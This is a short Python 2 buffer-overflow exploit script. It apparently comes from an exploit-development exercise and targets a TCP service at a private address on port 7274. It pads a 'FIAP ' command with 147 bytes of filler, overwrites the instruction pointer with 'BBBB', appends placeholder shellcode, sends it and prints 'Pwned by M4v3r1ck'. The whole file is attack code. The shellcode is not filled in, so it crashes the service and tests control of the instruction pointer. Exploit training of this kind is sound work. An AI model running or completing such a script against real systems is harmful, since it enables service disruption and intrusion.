#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import socket
from struct import *

host="192.168.255.198"
port = 7274

offset = "A" * 147
eip = "BBBB"
shellcode = "C" * 5000

payload = offset + eip + shellcode

buffer  = "FIAP "
buffer += payload

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

exp.connect((host,port))

print "[*] Pwned by M4v3r1ck..."
exp.recv(4096)
exp.send(buffer)
exp.close()

